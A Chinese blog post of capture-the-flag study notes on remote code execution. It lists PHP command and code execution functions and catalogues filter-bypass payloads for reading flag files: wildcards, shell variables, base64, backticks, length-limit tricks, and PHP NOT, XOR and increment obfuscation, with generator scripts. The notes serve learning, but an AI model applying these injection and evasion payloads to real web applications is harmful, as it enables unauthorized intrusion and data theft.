<!DOCTYPE html>
<html class="dark" lang="zh-CN" prefix="og: http://ogp.me/ns# 
fb: http://ogp.me/ns/fb#
article: http://ogp.me/ns/article#">
<head>
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="keywords" content="">

<title>CTF中的RCE || Bae</title>
<link rel="icon" href="http://example.com/favicon.ico" type="image/x-icon">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<meta property="og:title" content="CTF中的RCE">
<meta property="og:type" content="website">
<meta property="og:url" content="http://example.com/2024/10/31/CTF%E4%B8%AD%E7%9A%84RCE/index.html">
<meta property="og:image" content="">
<meta property="og:site_name" content="Bae">
<meta property="og:author" content="Bae">

  
  
  
  <meta name="description" content="rce：远程代码执行成因：在Web应用开发中为了灵活性、简洁性等会让应用调用代码执行函数或系统命令执行函数处理，若应用对用户的输入过滤不严，容易产生远程代码执行漏洞或系统命令执行漏洞；#系统命令执行函数system()：能将字符串作为OS命令执行，且返回命令执行结果；exec()：能将字符串作为OS命令执行，">


<script src="/js/wang.js"></script>

<link rel="stylesheet" href="/css/wang.css">
<link
rel="stylesheet"
href="https://unpkg.com/@waline/client@v3/dist/waline.css"
/>
<script> console.log("Hello hexo-theme-wang"); </script>
<meta name="generator" content="Hexo 7.3.0"></head>
<body>
<main>
    <div id="agplAlert" style="z-index: 9999;">
    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
</div>
    <div class="header-trigger" style="position: fixed; top: 0; left: 0; right: 0; height: 20px;"></div>
<div class="nav-toggle">
    <img src="/images/menu_ico/arrow.svg" alt="Toggle Menu">
</div>
<header>
    <nav>
        <ul>
            
                <li>
                    <a href="/" rel="noopener">
                        
                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="首页">
                        
                        首页
                    </a>
                </li>
            
                <li>
                    <a href="/archives" rel="noopener">
                        
                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="归档">
                        
                        归档
                    </a>
                </li>
            
                <li>
                    <a href="/categories" rel="noopener">
                        
                            <img src="/images/menu_ico/categories.svg" class="menu-icon" alt="分类">
                        
                        分类
                    </a>
                </li>
            
                <li>
                    <a href="/tags" rel="noopener">
                        
                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="标签">
                        
                        标签
                    </a>
                </li>
            
                <li>
                    <a href="/about" rel="noopener">
                        
                            <img src="/images/menu_ico/about.svg" class="menu-icon" alt="关于">
                        
                        关于
                    </a>
                </li>
            
                <li>
                    <a href="/links" rel="noopener">
                        
                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="友链">
                        
                        友链
                    </a>
                </li>
            
                <li>
                    <a href="/atom.xml" rel="noopener">
                        
                            <img src="/images/menu_ico/rss.svg" class="menu-icon" alt="RSS订阅">
                        
                        RSS订阅
                    </a>
                </li>
            
                <li>
                    <a target="_blank" href="https://www.travellings.cn/go.html" rel="noopener noopener">
                        
                            <img src="/images/menu_ico/train.svg" class="menu-icon" alt="开往">
                        
                        开往
                    </a>
                </li>
            
            
                <li>
                    <button class="search-toggle-btn" aria-label="打开搜索">
                        <img src="/images/menu_ico/search.svg" class="menu-icon" alt="search">
                        搜索
                    </button>
                </li>
            
        </ul>
    </nav>
</header>

<script src="/js/header.js"></script>

    
<script src="/js/search.js"></script>


    
        <!-- 搜索模态框 -->
        <div id="search-modal" class="search-modal">
          <div class="search-modal-content">
            <div class="search-header">
              <form class="search-form" action="#" onsubmit="return false;">
                <input type="text" id="search-input" placeholder="输入关键词搜索" autocomplete="off">
                <button type="button" class="search-close-btn" aria-label="关闭">
                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <line x1="18" y1="6" x2="6" y2="18"></line>
                    <line x1="6" y1="6" x2="18" y2="18"></line>
                  </svg>
                </button>
              </form>
            </div>
            <div id="search-results"></div>
          </div>
        </div>

        <script>
        // 向全局对象添加i18n数据，以便search.js使用
        window.WANG_THEME = window.WANG_THEME || {};
        window.WANG_THEME.i18n = {
          search: {
            noResults: '没有找到相关结果',
            loading: '正在加载...',
            placeholder: '输入关键词搜索',
            close: '关闭',
            shortcut_tip: '按 ESC 关闭',
            toggle_search: '打开搜索',
            error_loading: '加载搜索数据失败'
          }
        };
        </script>
    
    <aside class="sidebar-container sidebar-left">
    <div class="sidebar-bg">
        <h2 class="site-title">Bae</h2>
        <img class="avatar avatar-round" src="/images/avatar.webp" style="width:50px;" alt="网站头像">
        <h2 class="site-author">Bae</h2>
        <h3 class="site-subtitle"></h3>
    </div>
    <div class="sidebar-bg">
        <ul class="social_links">
            
                <li>
                    <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe" aria-label="Github的链接">
                        
                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
                            </div>
                        
                    </a>
                </li>
            
                <li>
                    <a href="mailto:xingwangzhe@outloock.com" aria-label="Email的链接">
                        
                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
                                <img src="/images/social_links/envelope.svg" class="icon" alt="Email的图标"><p>Email</p>
                            </div>
                        
                    </a>
                </li>
            
        </ul>
    </div>
</aside>
<div class="post-container">
  <article class="post">
    <h1 class="post-title">CTF中的RCE</h1>
    
    <div class="post-meta">
      <span class="post-date">发布于 <time datetime="2024-10-31T12:21:15.000Z">2024-10-31</time></span>
      
      
        <span class="post-updated">
          最后更新于 <time datetime="2025-03-09T21:54:40.797Z">2025-03-10</time>
        </span>
      
      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
    </div>
    <div class="post-content">
      <p>rce：远程代码执行</p>
<p>成因：在 Web 应用开发中为了灵活性、简洁性等会让应用调用代码执行函数或系统命令执行函数处理，若应用对用户的输入过滤不严，容易产生远程代码执行漏洞或系统命令执行漏洞；</p>
<h4 id="系统命令执行函数"><a class="markdownIt-Anchor" href="#系统命令执行函数">#</a> 系统命令执行函数</h4>
<p>system ()：能将字符串作为 OS 命令执行，且返回命令执行结果；</p>
<p>exec ()：能将字符串作为 OS 命令执行，但是只返回执行结果的最后一行 (约等于无回显)；</p>
<p>shell_exec ()：能将字符串作为 OS 命令执行</p>
<p>passthru ()：能将字符串作为 OS 命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；</p>
<p>popen ()：打开进程文件指针</p>
<p>proc_open ()：与 popen () 类似</p>
<p>pcntl_exec ()：在当前进程空间执行指定程序；</p>
<p>反引号 <code>：反引号</code> 内的字符串会被解析为 OS 命令；</p>
<h4 id="代码执行函数"><a class="markdownIt-Anchor" href="#代码执行函数">#</a> 代码执行函数</h4>
<p>PHP：eval (),assert (),preg_replace (),call_user_func (),call_user_func_array () 以及 array_map ()，system, shell_exec, popen, passthru, proc_open 等。<br>
Python：eval,exec,subprocess os.system commands.<br>
Java：Java 里面没有类似于 php 中的 eval 函数可以直接将字符串转化为代码执行的函数。但是又反射机制，并且有各种基于反射机制的表达式引擎。ps：OGNL, SpEL, MVEL</p>
<p>这里详细说明一下 php，在 ctf 题目中最为常出现</p>
<p>eval ()：将字符串作为 php 代码执行；</p>
<p>assert ()：将字符串作为 php 代码执行；</p>
<p>preg_replace ()：正则匹配替换字符串；</p>
<p>create_function ()：主要创建匿名函数；</p>
<p>call_user_func ()：回调函数，第一个参数为函数名，第二个参数为函数的参数；</p>
<p>call_user_func_array ()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</p>
<p>可变函数：若变量后有括号，该变量会被当做函数名为变量值 (前提是该变量值是存在的函数名) 的函数执行；</p>
<h2 id="rce绕过"><a class="markdownIt-Anchor" href="#rce绕过">#</a> rce 绕过</h2>
<p>最简单的就是直接遇到 flag 字样就卡住，这时可以利用 * 来查找</p>
<p><em>意思就是可以是任何字符         cat /flag.php   -----&gt;cat /f</em></p>
<p>这里就会找到 f 打头，后面随意的文件名</p>
<h4 id="即正则匹配绕过"><a class="markdownIt-Anchor" href="#即正则匹配绕过">#</a> 即正则匹配绕过</h4>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//如flag被过滤</span><br><span class="line">cat /f???</span><br><span class="line">cat /fl*</span><br><span class="line">cat /f[a-z]&#123;3&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="image-20241031205501710"><a class="markdownIt-Anchor" href="#image-20241031205501710">#</a> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031205501710.png"
                      alt="image-20241031205501710"
                ></h2>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031205501710.png"
                      alt=""
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031205632574.png"
                      alt="image-20241031205632574"
                ></p>
<p>但在 ctf 中，有下面这样的理解即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031205723564.png"
                      alt="image-20241031205723564"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031205816840.png"
                      alt="image-20241031205816840"
                ></p>
<p>下面又是一大块内容</p>
<h1 id="关键字绕过"><a class="markdownIt-Anchor" href="#关键字绕过">#</a> 关键字绕过</h1>
<h2 id="空格绕过"><a class="markdownIt-Anchor" href="#空格绕过">#</a> 空格绕过</h2>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031210010380.png"
                      alt="image-20241031210010380"
                ></p>
<h2 id="转义绕过"><a class="markdownIt-Anchor" href="#转义绕过">#</a> 转义绕过</h2>
<p>利用 \ ’ &quot; 进行转义</p>
<p>cat flag  —&gt;   ca\t fl\ag<br>
cat flag  —&gt;   ca&quot;t flag<br>
cat flag  —&gt;   ca’t flag</p>
<h2 id="特殊变量绕过"><a class="markdownIt-Anchor" href="#特殊变量绕过">#</a> 特殊变量绕过</h2>
<p>我们可以使用 Linux 中的一些特殊变量进行绕过</p>
<p>$* $@ $x ${X} // 这里的 x 代表任意值</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca$*t  flag.php</span><br><span class="line">ca$@t flag.php</span><br><span class="line">ca$xt flag.php</span><br><span class="line">ca$&#123;X&#125;t flag.php</span><br></pre></td></tr></table></figure></div>
<p>这些都是 shell 的特殊变量，也是可以用来绕过的，这种类型可以用在过滤了 cat 这种命令或者其他关键字符串上面使用。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031210829705.png"
                      alt="image-20241031210829705"
                ></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell --&gt;  ls</span><br><span class="line">-&gt; flag</span><br><span class="line">shell --&gt;  cat ?la*</span><br><span class="line">-&gt;flag&#123;ABsec&#125;</span><br></pre></td></tr></table></figure></div>
<p>下面是对这个骚操作的解释</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shell --&gt; cat ?la*</span><br><span class="line">这个命令的目的是读取文件内容，其中使用了 cat 和通配符：</span><br><span class="line"></span><br><span class="line">cat 是 Linux 中用于显示文件内容的命令。</span><br><span class="line"></span><br><span class="line">?la* 是一个通配符，用来匹配文件名的模式。具体解释如下：</span><br><span class="line"></span><br><span class="line">?：表示任意单个字符，所以这里的 ? 表示任何一个字符。</span><br><span class="line">la：表示文件名中紧跟在通配符后的具体字符组合，即匹配名称中包含 la 的文件。</span><br><span class="line">*：表示任意数量的字符（包括空字符），意味着文件名可以以 la 开头，后面可以跟任何字符。</span><br><span class="line">因此，?la* 可以匹配一个以任意单字符开头，紧跟着 la，后面可以是任意字符的文件名。在当前环境中，它成功匹配到了文件 flag，因为 flag 满足 ?la* 的模式（即文件名前有一个字符 f，紧跟 la，且文件名之后无字符）。</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20250228182734429.png"
                      alt="image-20250228182734429"
                ></p>
<h2 id="base64编码绕过"><a class="markdownIt-Anchor" href="#base64编码绕过">#</a> Base64 编码绕过</h2>
<p>这个可以用在一些命令被过滤的情况下使用，比如说我们的 ls 命令被过滤了，那我们可以将 ls 这个命令编码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;ls&#x27; | base64</span><br><span class="line">-&gt;bHMK</span><br><span class="line">`echo &#x27;bHMK&#x27; | base64 -d</span><br><span class="line">-&gt; flag.ph  test.php  ......</span><br></pre></td></tr></table></figure></div>
<p>就是先把 ls 的内容 base64 加密后再解密输出出来，就是绕了一下加解密的过程来绕过</p>
<h2 id="拼接法"><a class="markdownIt-Anchor" href="#拼接法">#</a> 拼接法</h2>
<p>这个的大概思路为，用两个参数来保存 flag 这个字符串的每个部分。大致如下</p>
<p>a=fl;b=ag;cat<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>F</mi><mi>S</mi></mrow><annotation encoding="application/x-tex">IFS</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>a$b;</p>
<p>类似于这种。</p>
<p>过滤命令执行函数 (ﾉ*･ω･)ﾉ<br>
内敛绕过<br>
这个其实很简单，就是将反引号内的命令的输出作为输入执行。</p>
<p>payload:url?c=127.0.0.1;cat<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>F</mi><mi>S</mi></mrow><annotation encoding="application/x-tex">IFS</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>! <code>ls</code></p>
<p>会抓取 ls 返回的所有文件内容。</p>
<p>内敛绕过还有其他的写法，比如下面：</p>
<p>echo $(ls);</p>
<p>?&gt;&lt;?=`ls1;</p>
<p>?&gt;&lt;?=$(ls);</p>
<p>使用其他函数<br>
还记得我们前面讲的取代函数吗？和这个的思路一样，如果我们的执行命令函数被过滤的花花，我们就需要更换函数了</p>
<p>我们除了 shell_exec () 还可以用以下几种</p>
<p>system()</p>
<p>passthru()</p>
<p>exec()</p>
<p>popen()</p>
<p>proc_open()</p>
<p>pcntl_exec()</p>
<p>highlight_file()</p>
<h4 id="读取文件"><a class="markdownIt-Anchor" href="#读取文件">#</a> 读取文件</h4>
<p>这里我们这样玩，我们除了 cat 可以显示文本内容以外，在 CTF 中我们还可以使用一下几个姿势</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl file:///flag</span><br><span class="line">strings flag</span><br><span class="line">uniq -c flag</span><br><span class="line">bash -v flag</span><br><span class="line">rev flag</span><br><span class="line">tac flag</span><br><span class="line">//如果说我们遇到ls被过滤的话，我们也可以使用find</span><br><span class="line">find</span><br><span class="line">-?&gt;  .   ./flag</span><br></pre></td></tr></table></figure></div>
<h3 id="字符串长度限制ノωノ"><a class="markdownIt-Anchor" href="#字符串长度限制ノωノ">#</a> 字符串长度限制 (ﾉ*･ω･)ﾉ</h3>
<p>这个挺有意思的，在 CTF 中，题目可能会限制你输入的长度，如果说我们要绕过他的话，我们可以只用上文中的一些思想，我们直接看 payload</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">-&gt; flag&#123;ABsec&#125;</span><br><span class="line">touch &quot;ag&quot;</span><br><span class="line">touch &quot;fl\\&quot;</span><br><span class="line">touch &quot;t \\&quot;</span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line">ls -t</span><br><span class="line">-&gt;ca\ ,  t \  ,  fl\  ,  ag  ,  shell ,  flag</span><br><span class="line">ls -t &gt; shell</span><br><span class="line">sh shell</span><br><span class="line">-&gt;flag&#123;ABsec&#125;</span><br></pre></td></tr></table></figure></div>
<p>首先是里面的一些命令</p>
<p>空格 \ ： 这个其实是换行。<br>
ls -t ：按照时间将文本排序输出<br>
 ls -t &gt; shell：将 ls -t 的输出储存到 shell 文件中<br>
我们首先是用 touch 命令创建了几个文件，但是他们的文件名是我们的主要。我们使用两个 \ 的原因在于，第一个 \ 用于将后面的 \ 变成字符串，第二个 \ 是用来将后面的文本转换为字符串，以便用于后面的测试。</p>
<p>这样我们 shell 里面的样子应该是这样的：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat shell</span><br><span class="line">-&gt;cat</span><br><span class="line">flag</span><br></pre></td></tr></table></figure></div>
<p>因为 \ 就是用来换行的，不然他们连在一起也无法被解析。</p>
<h3 id="path-ノωノ"><a class="markdownIt-Anchor" href="#path-ノωノ">#</a> $PATH (ﾉ*･ω･)ﾉ</h3>
<p>这个是利用环境变量来达到截取字母绕过的目的。</p>
<p>这里我们可以举一个例子：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">/opt/jdk-21/bin         //假如是这样的</span><br><span class="line">echo $&#123;PATH:2:1&#125;</span><br><span class="line">-&gt;p</span><br><span class="line">echo $&#123;PATH:3:1&#125;</span><br><span class="line">-&gt;t</span><br><span class="line">echo $&#123;PATH:3:2&#125;</span><br><span class="line">-&gt;t/</span><br></pre></td></tr></table></figure></div>
<p>Linux 中 ${PATH🅰️b} 我们可以理解为从 a 位开始截取，截取 b 个长度（/ 也算一位）</p>
<p>那我们对应这来的话就是这样的</p>
<p>/ o p t / j d k - 2 1 / b i n</p>
<p>0 1 2 3 4 5 6 7 8 9 10 11 12 13</p>
<p PATH:3:2="">比如说我们 echo $</p>
<p>那就表示，我们从 t 开始，往后截取两位数</p>
<p>输出: t/</p>
<p>但是这样可能也会出现一些没有的字母，但是我们需要那个字母的情况，这个时候我们可以自己取构造一个 PATH。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/abcdefghijklmn/opq/rst/uvw/xyz/0123456789</span><br></pre></td></tr></table></figure></div>
<p>我们直接将全部的字母和数字都放到环境变量中，需要的时候我们就用上面的那个方法进行构造 payload。、</p>
<p>有的题会没有回显</p>
<h4 id="取反绕过"><a class="markdownIt-Anchor" href="#取反绕过">#</a> 取反绕过</h4>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//取反传参</span><br><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;cat /flag&quot;;</span><br><span class="line"> </span><br><span class="line">$c = urlencode(~$a);</span><br><span class="line">$d = urlencode(~$b);</span><br><span class="line"> </span><br><span class="line">//输出得到取反传参内容</span><br><span class="line">echo &quot;?cmd=(~&quot;.$c.&quot;)(~&quot;.$d.&quot;);&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
<h4 id="异或绕过"><a class="markdownIt-Anchor" href="#异或绕过">#</a> 异或绕过</h4>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 异或构造Python脚本</span><br><span class="line">valid = &quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span><br><span class="line"> </span><br><span class="line">answer = input(&#x27;输入异或构造的字符串:&#x27;)</span><br><span class="line"> </span><br><span class="line">tmp1, tmp2 = &#x27;&#x27;, &#x27;&#x27;</span><br><span class="line">for c in answer:</span><br><span class="line">    for i in valid:</span><br><span class="line">        for j in valid:</span><br><span class="line">            if ord(i) ^ ord(j) == ord(c):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">        break</span><br><span class="line"> </span><br><span class="line">print(f&#x27;&quot;&#123;tmp1&#125;&quot;^&quot;&#123;tmp2&#125;&quot;&#x27;)</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//异或php脚本</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;phpinfo&#x27;;</span><br><span class="line">for ($i = 0;$i &lt;strlen($a);$i++)</span><br><span class="line">    echo &#x27;%&#x27;.dechex(ord($a[$i])^0xff);</span><br><span class="line">echo &quot;^&quot;;</span><br><span class="line">for ($j=0;$j&lt;strlen($a);$j++)</span><br><span class="line">    echo &#x27;%ff&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">//输出：%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//简单例题，flag再phpinfo()中，需要执行php命令：phpinfo();</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$mess=$_POST[&#x27;mess&#x27;];</span><br><span class="line">if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123;</span><br><span class="line">    die(&quot;invalid input!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">eval($mess);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//构造payload,字符串phpinfo异或结果为&quot;0302181&quot;^&quot;@[@[_^^&quot;</span><br><span class="line"> </span><br><span class="line">mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span><br></pre></td></tr></table></figure></div>
<h4 id="自增绕过"><a class="markdownIt-Anchor" href="#自增绕过">#</a> 自增绕过</h4>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//自增payload，assert($_POST[_]),命令传入_</span><br><span class="line"> </span><br><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);&amp;_=phpinfo();</span><br></pre></td></tr></table></figure></div>
<h4 id="黑名单绕过"><a class="markdownIt-Anchor" href="#黑名单绕过">#</a> 黑名单绕过</h4>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//变量拼接，如flag被过滤</span><br><span class="line">将：</span><br><span class="line">cat /flag</span><br><span class="line">替换为：</span><br><span class="line">b=ag;cat /fl$b</span><br><span class="line"> </span><br><span class="line">//读取根目录</span><br><span class="line">eval(var_dump(scandir(&#x27;/&#x27;););</span><br><span class="line">//读flag</span><br><span class="line">eval(var_dump(file_get_contents($_POST[&#x27;a&#x27;])););&amp;a=/flag</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//等效于打开ls目录下的文件</span><br><span class="line">cat `ls`</span><br><span class="line"> </span><br><span class="line">//_被过滤，php8以下，变量名中的第一个非法字符[会被替换为下划线_</span><br><span class="line">N[S.S等效于N_S.S</span><br><span class="line">php需要接收e_v.a.l参数,给e[v.a.l传参即可</span><br><span class="line"> </span><br><span class="line">//php标签绕过</span><br><span class="line">?&gt;&lt;?= phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031220300782.png"
                      alt="image-20241031220300782"
                ></p>
<h4 id="回溯绕过"><a class="markdownIt-Anchor" href="#回溯绕过">#</a> 回溯绕过</h4>
